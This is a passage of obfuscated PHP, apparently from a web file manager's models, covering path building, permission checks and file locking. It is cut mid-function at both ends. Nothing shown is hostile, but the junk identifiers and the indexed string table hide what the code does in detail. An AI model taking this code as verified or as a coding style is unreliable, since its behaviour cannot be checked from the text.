($„ûÀÄò as $ëÜ»ñ•Ì) { $šûçÖ¥ = $ëÜ»ñ•Ì[$…š›è™ó[179]]; $†˜ñÙà = $ëÜ»ñ•Ì[$…š›è™ó[452]] == $…š›è™ó[88] ? $…š›è™ó[223] : $…š›è™ó[222]; if (!isset($Ä”ÜÀĞ¡[$šûçÖ¥])) { $Ä”ÜÀĞ¡[$šûçÖ¥] = array($…š›è™ó[222] => 0, $…š›è™ó[223] => 0); } $Ä”ÜÀĞ¡[$šûçÖ¥][$†˜ñÙà] += $ëÜ»ñ•Ì[$…š›è™ó[532]]; } foreach ($‚ª¶£Ÿ¨ as &$æŸõ¶Óë) { if (!$æŸõ¶Óë[$…š›è™ó[452]]) { continue; } $ëûÏ’â = is_array($Ä”ÜÀĞ¡[$æŸõ¶Óë[$…š›è™ó[180]]]) ? $Ä”ÜÀĞ¡[$æŸõ¶Óë[$…š›è™ó[180]]] : $ë¨‘æÃ; $æŸõ¶Óë[$…š›è™ó[223]] = $ëûÏ’â[$…š›è™ó[223]]; $æŸõ¶Óë[$…š›è™ó[222]] = $ëûÏ’â[$…š›è™ó[222]]; unset($æŸõ¶Óë[$…š›è™ó[453]]); } unset($æŸõ¶Óë); } protected function _listAppendAuth(&$°Ïª£¶) { $úú¹çÅÅ =& $_SERVER[”ôÑ§ì¸]; $ÄšŠÒ“Í = array(); foreach ($°Ïª£¶ as $Õ–±²ú§) { if ($Õ–±²ú§[$úú¹çÅÅ[177]] == self::TYPE_GROUP) { $ÄšŠÒ“Í[] = $Õ–±²ú§[$úú¹çÅÅ[180]]; } } if (!$ÄšŠÒ“Í) { return; } $Â«¥•ø³ = array_to_keyvalue($°Ïª£¶, $úú¹çÅÅ[180]); $Ì·˜Ò­½ = Model($úú¹çÅÅ[534])->getSourceList($ÄšŠÒ“Í, $Â«¥•ø³); $ÑÎ«œ¨œ = $GLOBALS[$úú¹çÅÅ[535]] == 1; foreach ($°Ïª£¶ as $öûÉÈßå => &$Õ–±²ú§) { $Õ–±²ú§[$úú¹çÅÅ[454]] = $Ì·˜Ò­½[$Õ–±²ú§[$úú¹çÅÅ[180]]]; if (!$Õ–±²ú§[$úú¹çÅÅ[454]] && $Õ–±²ú§[$úú¹çÅÅ[177]] == self::TYPE_GROUP) { $Õ–±²ú§[$úú¹çÅÅ[454]] = Action($úú¹çÅÅ[536])->pathGroupAuthMake($Õ–±²ú§[$úú¹çÅÅ[537]]); if (!$Õ–±²ú§[$úú¹çÅÅ[454]] && !$ÑÎ«œ¨œ) { $Õ–±²ú§[$úú¹çÅÅ[216]] = !1; $Õ–±²ú§[$úú¹çÅÅ[215]] = !1; } } if ($Õ–±²ú§[$úú¹çÅÅ[454]]) { $Õ–±²ú§[$úú¹çÅÅ[216]] = AuthModel::authCheckEdit($Õ–±²ú§[$úú¹çÅÅ[454]][$úú¹çÅÅ[455]]); $Õ–±²ú§[$úú¹çÅÅ[215]] = AuthModel::authCheckView($Õ–±²ú§[$úú¹çÅÅ[454]][$úú¹çÅÅ[455]]); } $this->groupPathDisplay($Õ–±²ú§); } unset($Õ–±²ú§); } public function _listAppendAuthSecret(&$ŒùÂ¢‘) { $á––æÛ =& $_SERVER[”ôÑ§ì¸]; if (Model($á––æÛ[475])->get($á––æÛ[538]) != $á––æÛ[88]) { return; } static $âÍ¿ë¤× = false; if (!$âÍ¿ë¤×) { $šìûñİ = Model($á––æÛ[539]); $ÂÆ¾‰…î = Model($á––æÛ[540]); $âÍ¿ë¤× = $ÂÆ¾‰…î->listData(); $âÍ¿ë¤× = array_to_keyvalue($âÍ¿ë¤×, $á––æÛ[180]); $áË´½üÙ = json_decode(Model($á––æÛ[475])->get($á––æÛ[541]), !0); $áË´½üÙ = array_to_keyvalue($áË´½üÙ, $á––æÛ[442]); foreach ($âÍ¿ë¤× as $…ù’Áëî => $üœß£Â) { $¿ÓéÉ”„ = $áË´½üÙ[$üœß£Â[$á––æÛ[542]]]; if (!$¿ÓéÉ”„) { $ÂÆ¾‰…î->remove($üœß£Â[$á––æÛ[442]]); unset($âÍ¿ë¤×[$…ù’Áëî]); continue; } $şËÛåŒÚ = $šìûñİ->listData($¿ÓéÉ”„[$á––æÛ[454]]); if (!$şËÛåŒÚ) { $ÂÆ¾‰…î->remove($üœß£Â[$á––æÛ[442]]); unset($âÍ¿ë¤×[$…ù’Áëî]); continue; } $üœß£Â[$á––æÛ[454]] = $şËÛåŒÚ; $üœß£Â[$á––æÛ[543]] = $¿ÓéÉ”„; $üœß£Â[$á––æÛ[544]] = Model($á––æÛ[545])->getInfoSimpleOuter($üœß£Â[$á––æÛ[494]]); $âÍ¿ë¤×[$…ù’Áëî] = $üœß£Â; } } $Õ§„äş = USER_ID; $“ªÆóÅª = array(); $ğÒ…ÅÕ = $this->_listAppendPath($“ªÆóÅª, !0); foreach ($ŒùÂ¢‘ as $…ù’Áëî => &$üœß£Â) { if (!is_array($üœß£Â[$á––æÛ[454]])) { continue; } if ($üœß£Â[$á––æÛ[177]] != $á––æÛ[546]) { continue; } if (isset($âÍ¿ë¤×[$üœß£Â[$á––æÛ[180]]])) { $´ş©Šò = $âÍ¿ë¤×[$üœß£Â[$á––æÛ[180]]]; if (!is_array($üœß£Â[$á––æÛ[506]])) { $üœß£Â[$á––æÛ[506]] = array(); } $üœß£Â[$á––æÛ[506]][$á––æÛ[547]] = $´ş©Šò[$á––æÛ[542]]; $üœß£Â[$á––æÛ[454]][$á––æÛ[548]] = $´ş©Šò; $üœß£Â[$á––æÛ[454]][$á––æÛ[549]] = $üœß£Â[$á––æÛ[550]]; $üœß£Â[$á––æÛ[454]][$á––æÛ[551]] = $á––æÛ[88]; if ($´ş©Šò[$á––æÛ[494]] != $Õ§„äş) { $üœß£Â[$á––æÛ[454]][$á––æÛ[455]] = $üœß£Â[$á––æÛ[454]][$á––æÛ[455]] & $´ş©Šò[$á––æÛ[454]][$á––æÛ[454]]; } continue; } $ÄÇë™Ú = $this->parentLevelArray($üœß£Â[$á––æÛ[552]]); $Î÷¼ú« = array_reverse($ÄÇë™Ú); foreach ($Î÷¼ú« as $°¨Ïö¯ => $ïüëü¾) { if (!isset($âÍ¿ë¤×[$ïüëü¾])) { continue; } $´ş©Šò = $âÍ¿ë¤×[$ïüëü¾]; $üœß£Â[$á––æÛ[454]][$á––æÛ[548]] = $´ş©Šò; if ($´ş©Šò[$á––æÛ[494]] != $Õ§„äş) { $üœß£Â[$á––æÛ[454]][$á––æÛ[455]] = $üœß£Â[$á––æÛ[454]][$á––æÛ[455]] & $´ş©Šò[$á––æÛ[454]][$á––æÛ[454]]; } $Âôİëõ = $á––æÛ[12]; $½«Àœ® = count($ÄÇë™Ú) - $°¨Ïö¯; for ($ºÜİí¼ = 0; $ºÜİí¼ < $½«Àœ®; $ºÜİí¼++) { if (!isset($ğÒ…ÅÕ[$ÄÇë™Ú[$ºÜİí¼]])) { $Âôİëõ = $á––æÛ[12]; break; } $Âôİëõ = $Âôİëõ . rtrim($ğÒ…ÅÕ[$ÄÇë™Ú[$ºÜİí¼]], $á––æÛ[8]) . $á––æÛ[8]; } $üœß£Â[$á––æÛ[454]][$á––æÛ[549]] = rtrim($Âôİëõ, $á––æÛ[8]) . $á––æÛ[8]; break; } } unset($üœß£Â); } public function groupPathDisplay(&$Üè•ûúÕ) { $Ìæ¯ø‚ß =& $_SERVER[”ôÑ§ì¸]; if ($Üè•ûúÕ[$Ìæ¯ø‚ß[177]] != self::TYPE_GROUP) { return; } $ÖÍµìûı = Model($Ìæ¯ø‚ß[553])->getInfo($Üè•ûúÕ[$Ìæ¯ø‚ß[537]]); $êşóÃ¶¿ = $this->parentLevelArray($ÖÍµìûı[$Ìæ¯ø‚ß[552]]); $¼¤ÃÈ–³ = $Ìæ¯ø‚ß[12]; foreach ($êşóÃ¶¿ as $¯½°ÒÁù) { $¿ÃŸï²Å = Model($Ìæ¯ø‚ß[553])->getInfo($¯½°ÒÁù); $¼¤ÃÈ–³ .= $¿ÃŸï²Å[$Ìæ¯ø‚ß[87]][$Ìæ¯ø‚ß[180]] . $Ìæ¯ø‚ß[50]; } $Üè•ûúÕ[$Ìæ¯ø‚ß[554]] = $ÖÍµìûı[$Ìæ¯ø‚ß[179]]; $Üè•ûúÕ[$Ìæ¯ø‚ß[555]] = $ÖÍµìûı[$Ìæ¯ø‚ß[552]]; $Üè•ûúÕ[$Ìæ¯ø‚ß[556]] = $ÖÍµìûı[$Ìæ¯ø‚ß[557]]; $Üè•ûúÕ[$Ìæ¯ø‚ß[558]] = $¼¤ÃÈ–³ . $ÖÍµìûı[$Ìæ¯ø‚ß[87]][$Ìæ¯ø‚ß[180]]; } protected function _listAppendPath(&$å¤¼Š¡ü, $Ñƒ§ÒÙ = false) { $µˆËúé« =& $_SERVER[”ôÑ§ì¸]; static $‰ÖÕòÂì = array(); $ƒøïä×Ø = array(); $Û¯„Ş¢ƒ = array(); if ($Ñƒ§ÒÙ) { return $‰ÖÕòÂì; } foreach ($å¤¼Š¡ü as &$»î”ÚÛ¸) { $üÎÖ¹ı  = $»î”ÚÛ¸[$µˆËúé«[180]]; if ($»î”ÚÛ¸[$µˆËúé«[452]] == $µˆËúé«[88] && $»î”ÚÛ¸[$µˆËúé«[179]] != 0) { $‰ÖÕòÂì[$üÎÖ¹ı ] = $»î”ÚÛ¸[$µˆËúé«[32]]; } if ($»î”ÚÛ¸[$µˆËúé«[452]] == $µˆËúé«[88] && $»î”ÚÛ¸[$µˆËúé«[179]] == 0) { $‰ÖÕòÂì[$üÎÖ¹ı ] = $this->_listAppendPathRoot($»î”ÚÛ¸, array()); } if (isset($Û¯„Ş¢ƒ[$»î”ÚÛ¸[$µˆËúé«[552]]])) { continue; } $Û¯„Ş¢ƒ[$»î”ÚÛ¸[$µˆËúé«[552]]] = !0; $á¯×Ë® = $this->parentLevelArray($»î”ÚÛ¸[$µˆËúé«[552]]); foreach ($á¯×Ë® as $³ÅîÓÀÂ => $Ï‹áÀ‹‰) { if (isset($‰ÖÕòÂì[$Ï‹áÀ‹‰])) { continue; } if ($³ÅîÓÀÂ == 0) { $‰ÖÕòÂì[$Ï‹áÀ‹‰] = $this->_listAppendPathRoot($»î”ÚÛ¸, $á¯×Ë®); } if ($³ÅîÓÀÂ != 0) { $ƒøïä×Ø[] = $Ï‹áÀ‹‰; } } } unset($»î”ÚÛ¸); $ƒøïä×Ø = array_unique($ƒøïä×Ø); if (count($ƒøïä×Ø) > 0) { $×–‹ü¿„ = array($µˆËúé«[458] => array($µˆËúé«[459], $ƒøïä×Ø)); if (count($ƒøïä×Ø) == 1) { $îÃí™ìÇ = $this->sourceInfo($ƒøïä×Ø[0]); $ìÕûºÄ  = is_array($îÃí™ìÇ) ? array($îÃí™ìÇ) : !1; } else { $ìÕûºÄ  = $this->field($µˆËúé«[559])->where($×–‹ü¿„)->select(); } if (!$ìÕûºÄ ) { $ìÕûºÄ  = array(); } foreach ($ìÕûºÄ  as $¢êÅ²£Ó) { $‰ÖÕòÂì[$¢êÅ²£Ó[$µˆËúé«[180]]] = $¢êÅ²£Ó[$µˆËúé«[32]]; } } $õ²±¸ôı = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $—Ù°¿¯ = array(); foreach ($å¤¼Š¡ü as &$»î”ÚÛ¸) { $÷ˆ¥Õªğ = $»î”ÚÛ¸[$µˆËúé«[552]]; $ìì×µ¡Ø = $µˆËúé«[12]; if (isset($—Ù°¿¯[$÷ˆ¥Õªğ])) { $ìì×µ¡Ø = $—Ù°¿¯[$÷ˆ¥Õªğ]; } else { $á¯×Ë® = $this->parentLevelArray($»î”ÚÛ¸[$µˆËúé«[552]]); foreach ($á¯×Ë® as $³ÅîÓÀÂ => $Ï‹áÀ‹‰) { if (isset($‰ÖÕòÂì[$Ï‹áÀ‹‰])) { $ìì×µ¡Ø .= $‰ÖÕòÂì[$Ï‹áÀ‹‰] . $µˆËúé«[8]; } } $—Ù°¿¯[$÷ˆ¥Õªğ] = $ìì×µ¡Ø; } $ìì×µ¡Ø .= $»î”ÚÛ¸[$µˆËúé«[32]]; if ($»î”ÚÛ¸[$µˆËúé«[452]] == $µˆËúé«[88]) { $ìì×µ¡Ø .= $µˆËúé«[8]; } $»î”ÚÛ¸[$µˆËúé«[550]] = str_replace($µˆËúé«[560], $µˆËúé«[8], $ìì×µ¡Ø); if ($»î”ÚÛ¸[$µˆËúé«[179]] == $µˆËúé«[211]) { $»î”ÚÛ¸[$µˆËúé«[32]] = trim($‰ÖÕòÂì[$»î”ÚÛ¸[$µˆËúé«[180]]], $µˆËúé«[8]); $»î”ÚÛ¸[$µˆËúé«[550]] = $»î”ÚÛ¸[$µˆËúé«[32]] . $µˆËúé«[8]; } if (intval($»î”ÚÛ¸[$µˆËúé«[177]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($»î”ÚÛ¸, $á¯×Ë®, $õ²±¸ôı); } } unset($»î”ÚÛ¸); return $å¤¼Š¡ü; } private function _listAppendPathRecycle(&$’Å€Éú, $‹Ğ¾Ä£, $ÚŞ“ì’) { $ÙİüïÊ =& $_SERVER[”ôÑ§ì¸]; if (!in_array($ÚŞ“ì’, $‹Ğ¾Ä£) && $’Å€Éú[$ÙİüïÊ[180]] != $ÚŞ“ì’) { return; } $ì®§¨¬” = explode($ÙİüïÊ[8], trim($’Å€Éú[$ÙİüïÊ[550]], $ÙİüïÊ[8])); $ªúù¼å¥ = implode($ÙİüïÊ[8], array_slice($ì®§¨¬”, 2)); $’Å€Éú[$ÙİüïÊ[550]] = $ÙİüïÊ[8] . LNG($ÙİüïÊ[561]) . $ÙİüïÊ[8] . ltrim($ªúù¼å¥, $ÙİüïÊ[8]); $’Å€Éú[$ÙİüïÊ[552]] = $ÙİüïÊ[562] . implode($ÙİüïÊ[50], array_slice($‹Ğ¾Ä£, 1)) . $ÙİüïÊ[50]; if ($’Å€Éú[$ÙİüïÊ[180]] == $ÚŞ“ì’) { $’Å€Éú[$ÙİüïÊ[552]] = $ÙİüïÊ[562]; $’Å€Éú[$ÙİüïÊ[179]] = $ÙİüïÊ[211]; $’Å€Éú[$ÙİüïÊ[32]] = LNG($ÙİüïÊ[561]); } $’Å€Éú[$ÙİüïÊ[563]] = $ÙİüïÊ[564]; } protected function _listAppendPathRoot(&$¿ëŞäÅª, $Šá¤¯Å‚) { $æ¦×¾í¸ =& $_SERVER[”ôÑ§ì¸]; static $Ïëü­º = false; $•ÅÉ‚Ø = $æ¦×¾í¸[12]; if ($¿ëŞäÅª[$æ¦×¾í¸[177]] == self::TYPE_USER) { if ($¿ëŞäÅª[$æ¦×¾í¸[537]] == USER_ID) { $•ÅÉ‚Ø = LNG($æ¦×¾í¸[565]); if ($Ïëü­º === !1) { $ö“Ù®ÒŞ = Model($æ¦×¾í¸[566])->getInfoFull(USER_ID); $Ïëü­º = _get($ö“Ù®ÒŞ, $æ¦×¾í¸[567], $æ¦×¾í¸[12]); } if ($Šá¤¯Å‚ && $Šá¤¯Å‚[0] == $Ïëü­º || !$Šá¤¯Å‚ && $¿ëŞäÅª[$æ¦×¾í¸[180]] == $Ïëü­º) { $•ÅÉ‚Ø = LNG($æ¦×¾í¸[568]); $¿ëŞäÅª[$æ¦×¾í¸[569]] = $æ¦×¾í¸[570]; } if (!$Šá¤¯Å‚) { $¿ëŞäÅª[$æ¦×¾í¸[32]] = $•ÅÉ‚Ø; } } else { $¿ëŞäÅª[$æ¦×¾í¸[571]] = Model($æ¦×¾í¸[545])->getInfoSimpleOuter($¿ëŞäÅª[$æ¦×¾í¸[537]]); $•ÅÉ‚Ø = LNG($æ¦×¾í¸[572]) . $æ¦×¾í¸[162] . $¿ëŞäÅª[$æ¦×¾í¸[571]][$æ¦×¾í¸[32]] . $æ¦×¾í¸[164]; } } else { if ($¿ëŞäÅª[$æ¦×¾í¸[177]] == self::TYPE_GROUP) { $Î•®„¡ö = Model($æ¦×¾í¸[553])->getInfoSimple($¿ëŞäÅª[$æ¦×¾í¸[537]]); $•ÅÉ‚Ø = $Î•®„¡ö[$æ¦×¾í¸[32]]; } else { if ($¿ëŞäÅª[$æ¦×¾í¸[177]] == self::TYPE_SYSTEM) { $•ÅÉ‚Ø = $æ¦×¾í¸[573]; } } } $•ÅÉ‚Ø = $•ÅÉ‚Ø ? $æ¦×¾í¸[8] . $•ÅÉ‚Ø . $æ¦×¾í¸[8] : $æ¦×¾í¸[8]; return $•ÅÉ‚Ø; } protected function _listAppendUser(&$¬¥õüë) { $ˆùÃÇİƒ =& $_SERVER[”ôÑ§ì¸]; $ÑšØÀÇ = array_to_keyvalue($¬¥õüë, $ˆùÃÇİƒ[12], $ˆùÃÇİƒ[494]); $Ğ²Øğ‚ = array_to_keyvalue($¬¥õüë, $ˆùÃÇİƒ[12], $ˆùÃÇİƒ[496]); $ê²ú»°ë = array_merge($ÑšØÀÇ, $Ğ²Øğ‚); $¼‹Š’‚¿ = Model($ˆùÃÇİƒ[566])->userListInfo($ê²ú»°ë); foreach ($¬¥õüë as &$Ûİõ—ğŒ) { $üŠƒ¹ˆÂ = $Ûİõ—ğŒ[$ˆùÃÇİƒ[494]]; $Ûİõ—ğŒ[$ˆùÃÇİƒ[494]] = $¼‹Š’‚¿[$üŠƒ¹ˆÂ] ? $¼‹Š’‚¿[$üŠƒ¹ˆÂ] : !1; $üŠƒ¹ˆÂ = $Ûİõ—ğŒ[$ˆùÃÇİƒ[496]]; $Ûİõ—ğŒ[$ˆùÃÇİƒ[496]] = $¼‹Š’‚¿[$üŠƒ¹ˆÂ] ? $¼‹Š’‚¿[$üŠƒ¹ˆÂ] : !1; if (isset($Ûİõ—ğŒ[$ˆùÃÇİƒ[506]]) && $Ûİõ—ğŒ[$ˆùÃÇİƒ[506]][$ˆùÃÇİƒ[574]]) { $¹‚»Ç‚° = $GLOBALS[$ˆùÃÇİƒ[6]][$ˆùÃÇİƒ[89]][$ˆùÃÇİƒ[575]]; if ($Ûİõ—ğŒ[$ˆùÃÇİƒ[506]][$ˆùÃÇİƒ[576]] <= time() - $¹‚»Ç‚°) { $this->metaSet($Ûİõ—ğŒ[$ˆùÃÇİƒ[180]], $ˆùÃÇİƒ[574], null); $this->metaSet($Ûİõ—ğŒ[$ˆùÃÇİƒ[180]], $ˆùÃÇİƒ[576], null); unset($Ûİõ—ğŒ[$ˆùÃÇİƒ[506]][$ˆùÃÇİƒ[574]]); continue; } $÷ıöœÑæ = $Ûİõ—ğŒ[$ˆùÃÇİƒ[506]][$ˆùÃÇİƒ[574]]; $Ûİõ—ğŒ[$ˆùÃÇİƒ[506]][$ˆùÃÇİƒ[577]] = Model($ˆùÃÇİƒ[566])->getInfoSimpleOuter($÷ıöœÑæ); } } unset($Ûİõ—ğŒ); } public function parentLevelArray($™ÛÂšÅÔ) { $ıõöäÏ =& $_SERVER[”ôÑ§ì¸]; $™ÛÂšÅÔ = explode($ıõöäÏ[50], trim($™ÛÂšÅÔ, $ıõöäÏ[50])); return array_remove_value($™ÛÂšÅÔ, $ıõöäÏ[211]); } public function listAll($ŠÑŠ¶“İ) { $â”ãÕ°¬ =& $_SERVER[”ôÑ§ì¸]; $–…Ã¾¥Ê = $this->sourceInfo($ŠÑŠ¶“İ); $©»µÛ´Ï = array($â”ãÕ°¬[578] => array($â”ãÕ°¬[579], $–…Ã¾¥Ê[$â”ãÕ°¬[552]] . $ŠÑŠ¶“İ . $â”ãÕ°¬[580]), $â”ãÕ°¬[581] => 0); $ÚÉíÚŠ¸ = $â”ãÕ°¬[582]; $¯¨¾ˆª¡ = "\x4c\105\106\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\146\x69\154\145\x20\146\151\154\x65\x20\157\x6e\x20\163\157\165\162\143\x65\56\x66\151\x6c\x65\x49\x44\40\x3d\x20\146\x69\x6c\x65\56\146\151\154\x65\x49\104"; $ÜË‡—˜â = $this->alias($â”ãÕ°¬[486])->field($ÚÉíÚŠ¸)->where($©»µÛ´Ï)->join($¯¨¾ˆª¡)->select(); $this->_listAppendAuth($ÜË‡—˜â); $this->_listAppendUser($ÜË‡—˜â); $this->_listAppendPath($ÜË‡—˜â); $ÜË‡—˜â = array_to_keyvalue($ÜË‡—˜â, $â”ãÕ°¬[180]); $İÈèà’ü = "\x2f{$–…Ã¾¥Ê[$â”ãÕ°¬[32]]}\57"; $İÈèà’ü = $İÈèà’ü == $â”ãÕ°¬[560] ? $â”ãÕ°¬[8] : $İÈèà’ü; $…¥…éî = array(); foreach ($ÜË‡—˜â as $¯İ¸…ÃŞ => $¹¾Åñ§) { $¢ôĞœ± = $this->parentLevelArray($¹¾Åñ§[$â”ãÕ°¬[552]]); array_shift($¢ôĞœ±); $Õ“äŒò = $İÈèà’ü; for ($ËæŸ«°ƒ = 0; $ËæŸ«°ƒ < count($¢ôĞœ±); $ËæŸ«°ƒ++) { $Õ“äŒò .= $ÜË‡—˜â[$¢ôĞœ±[$ËæŸ«°ƒ]][$â”ãÕ°¬[32]] . $â”ãÕ°¬[8]; } $Õ“äŒò .= $¹¾Åñ§[$â”ãÕ°¬[32]]; if ($¹¾Åñ§[$â”ãÕ°¬[452]]) { $Õ“äŒò .= $â”ãÕ°¬[8]; } $–ºÓÊÕÃ = array($â”ãÕ°¬[462] => str_replace($â”ãÕ°¬[560], $â”ãÕ°¬[8], str_replace($â”ãÕ°¬[560], $â”ãÕ°¬[8], str_replace($â”ãÕ°¬[560], $â”ãÕ°¬[8], $Õ“äŒò))), $â”ãÕ°¬[583] => intval($¹¾Åñ§[$â”ãÕ°¬[452]]), $â”ãÕ°¬[584] => intval($¹¾Åñ§[$â”ãÕ°¬[76]]), $â”ãÕ°¬[85] => intval($¹¾Åñ§[$â”ãÕ°¬[85]]), $â”ãÕ°¬[87] => $this->pathInfoFilter($¹¾Åñ§)); if (!$–ºÓÊÕÃ[$â”ãÕ°¬[452]]) { $–ºÓÊÕÃ[$â”ãÕ°¬[508]] = $¹¾Åñ§[$â”ãÕ°¬[508]]; } $…¥…éî[] = $–ºÓÊÕÃ; } $…¥…éî = array_sort_by($…¥…éî, $â”ãÕ°¬[84]); return $…¥…éî; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ï…îÏç) { $«Í®åÛ =& $_SERVER[”ôÑ§ì¸]; if (!$this->allowLock()) { return; } $this->_lockCheck($«Í®åÛ[585], $Ï…îÏç); $³Çû‚ë = 1; $this->_lockEvent($Ï…îÏç, array($«Í®åÛ[586], $«Í®åÛ[587]), $³Çû‚ë); $this->_lockParent($Ï…îÏç, array($«Í®åÛ[587]), $³Çû‚ë); $this->_lockEvent($Ï…îÏç, array($«Í®åÛ[588], $«Í®åÛ[589]), $³Çû‚ë); $this->_lockCheckEnd($«Í®åÛ[585], $Ï…îÏç); } public function lockCopyEnd($¢ëñ¼Ñ) { $İÎ”è¸ =& $_SERVER[”ôÑ§ì¸]; if (!$this->allowLock()) { return; } $€…Å†Æ¸ = 0; $this->_lockEvent($¢ëñ¼Ñ, array($İÎ”è¸[586], $İÎ”è¸[587]), $€…Å†Æ¸); $this->_lockParent($¢ëñ¼Ñ, array($İÎ”è¸[587]), $€…Å†Æ¸); $this->_lockEvent($¢ëñ¼Ñ, array($İÎ”è¸[588], $İÎ”è¸[589]), $€…Å†Æ¸); } public function lockWriteStart($Ù‚ûÑê², $ÕÅ¢† = '') { $úˆÂğòù =& $_SERVER[”ôÑ§ì¸]; if (!$this->allowLock()) { return; } $this->_lockCheck($úˆÂğòù[586], $Ù‚ûÑê²); $—úÚßâÎ = 1; $this->_lockKey($úˆÂğòù[590] . $Ù‚ûÑê² . $úˆÂğòù[10] . $ÕÅ¢†, $—úÚßâÎ); $this->_lockEvent($Ù‚ûÑê², array($úˆÂğòù[585], $úˆÂğòù[587]), $—úÚßâÎ); $this->_lockParent($Ù‚ûÑê², array($úˆÂğòù[585], $úˆÂğòù[587]), $—úÚßâÎ); $this->_lockCheckEnd($úˆÂğòù[586], $Ù‚ûÑê²); } public function lockWriteEnd($ùôöõ×İ, $™ñªúÓª = '') { $‚¥õ‰÷¿ =& $_SERVER[”ôÑ§ì¸]; if (!$this->allowLock()) { return; } $ûŒé‚¹è = 0; $this->_lockKey($‚¥õ‰÷¿[590] . $ùôöõ×İ . $‚¥õ‰÷¿[10] . $™ñªúÓª, $ûŒé‚¹è); $this->_lockEvent($ùôöõ×İ, array($‚¥õ‰÷¿[585], $‚¥õ‰÷¿[587]), $ûŒé‚¹è); $this->_lockParent($ùôöõ×İ, array($‚¥õ‰÷¿[585], $‚¥õ‰÷¿[587]), $ûŒé‚¹è); } public function lockMoveStart($«¨ğå±) { $–Ö‹Øç¢ =& $_SERVER[”ôÑ§ì¸]; if (!$this->allowLock()) { return; } $this->_lockCheck($–Ö‹Øç¢[587], $«¨ğå±); $¼‹‹£ŒÄ = 1; $this->_lockKey($–Ö‹Øç¢[591] . $«¨ğå±, $¼‹‹£ŒÄ); $this->_lockEvent($«¨ğå±, array($–Ö‹Øç¢[585], $–Ö‹Øç¢[586]), $¼‹‹£ŒÄ); $this->_lockParent($«¨ğå±, array($–Ö‹Øç¢[585], $–Ö‹Øç¢[587]), $¼‹‹£ŒÄ); $this->_lockEvent($«¨ğå±, array($–Ö‹Øç¢[592], $–Ö‹Øç¢[588], $–Ö‹Øç¢[589]), $¼‹‹£ŒÄ); $this->_lockCheckEnd($–Ö‹Øç¢[587], $«¨ğå±); } public function lockMoveEnd($‚ğè¦Úú) { $ËªÎ‘µÚ =& $_SERVER[”ôÑ§ì¸]; if (!$this->allowLock()) { return; } $áŸ‡·– = 0; $this->_lockKey($ËªÎ‘µÚ[591] . $‚ğè¦Úú, $áŸ‡·–); $this->_lockEvent($‚ğè¦Úú, array($ËªÎ‘µÚ[585], $ËªÎ‘µÚ[586]), $áŸ‡·–); $this->_lockParent($‚ğè¦Úú, array($ËªÎ‘µÚ[585], $ËªÎ‘µÚ[587]), $áŸ‡·–); $this->_lockEvent($‚ğè¦Úú, array($ËªÎ‘µÚ[592], $ËªÎ‘µÚ[588], $ËªÎ‘µÚ[589]), $áŸ‡·–); } private function _lockCheck($…û­Ö¸·, $š ‹…© ) { $ÔÛìéÇ• =& $_SERVER[”ôÑ§ì¸]; $™¶½Ë˜ = $this->sourceInfo($š ‹…© ); $º†È‚è× = $…û­Ö¸· . $ÔÛìéÇ•[10] . $š ‹…© ; $this->_lockTimeStart[$º†È‚è×] = timeFloat(); if (!is_array($™¶½Ë˜)) { return; } $®ËÑÎ± = LNG($ÔÛìéÇ•[593]); CacheLock::setErrorMsg($ÔÛìéÇ•[162] . htmlspecialchars($™¶½Ë˜[$ÔÛìéÇ•[32]]) . $ÔÛìéÇ•[164] . $®ËÑÎ±); $this->_lockKey($º†È‚è×, 1); $this->_lockKey($º†È‚è×, 0); $äñşù…Ì = array_reverse($this->parentLevelArray($™¶½Ë˜[$ÔÛìéÇ•[552]])); foreach ($äñşù…Ì as $€ß¬‹·Ö) { $º†È‚è× = $…û­Ö¸· . $ÔÛìéÇ•[594] . $€ß¬‹·Ö; if (CacheLock::lockGet($ÔÛìéÇ•[595] . $º†È‚è×)) { $™¶½Ë˜ = $this->sourceInfo($€ß¬‹·Ö); CacheLock::setErrorMsg($ÔÛìéÇ•[162] . htmlspecialchars($™¶½Ë˜[$ÔÛìéÇ•[32]]) . $ÔÛìéÇ•[164] . $®ËÑÎ±); $this->_lockKey($º†È‚è×, 1); $this->_lockKey($º†È‚è×, 0); } } } private function _lockCheckEnd($™ßøÊìµ, $Òû¸öŞ¡) { $ú©—‘ô =& $_SERVER[”ôÑ§ì¸]; $¸öÖ×Ş = $™ßøÊìµ . $ú©—‘ô[10] . $Òû¸öŞ¡; CacheLock::setErrorMsg($ú©—‘ô[421]); if (!isset($this->_lockTimeStart[$¸öÖ×Ş])) { return; } $¼”ÀÒÇÈ = timeFloat() - $this->_lockTimeStart[$¸öÖ×Ş]; unset($this->_lockTimeStart[$¸öÖ×Ş]); if ($¼”ÀÒÇÈ > 0.5) { unset(self::$cacheSourceInfo[$ú©—‘ô[500] . $Òû¸öŞ¡]); } $Ùç²ç = $this->sourceInfo($Òû¸öŞ¡); if (!$Ùç²ç) { show_json(LNG($ú©—‘ô[105]), !1); } } private function _lockParent($èğ×Î÷Š, $ş°ÏÔÈĞ, $úÁ×¨—œ) { if (!$this->autoLockSet) { return; } $†ÔŠÈï‘ = $this->sourceInfo($èğ×Î÷Š); if (!is_array($†ÔŠÈï‘)) { return; } $¦œíñÌè = array_reverse($this->parentLevelArray($†ÔŠÈï‘[$_SERVER[”ôÑ§ì¸][552]])); foreach ($¦œíñÌè as $³äº©¦) { $this->_lockEvent($³äº©¦, $ş°ÏÔÈĞ, $úÁ×¨—œ); } } private function _lockEvent($œŞæ’Ş, $‚£©—ˆ, $óÛõ¢¸ã) { $´ÕãÉİÕ =& $_SERVER[”ôÑ§ì¸]; if (!$this->autoLockSet) { return; } foreach ($‚£©—ˆ as $¨«»£§ß) { $ÎÙÜŠÆİ = $¨«»£§ß . $´ÕãÉİÕ[10] . $œŞæ’Ş; if ($óÛõ¢¸ã && CacheLock::lockGet($´ÕãÉİÕ[595] . $ÎÙÜŠÆİ)) { continue; } $this->_lockKey($ÎÙÜŠÆİ, $óÛõ¢¸ã); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ï¸¡£œø, $‚‹½Í·ø = 1) { $Ç¤àø£Ö = $_SERVER[”ôÑ§ì¸][595] . md5($ï¸¡£œø); if ($‚‹½Í·ø) { if (isset(self::$_lockItemArr[$Ç¤àø£Ö])) { return; } 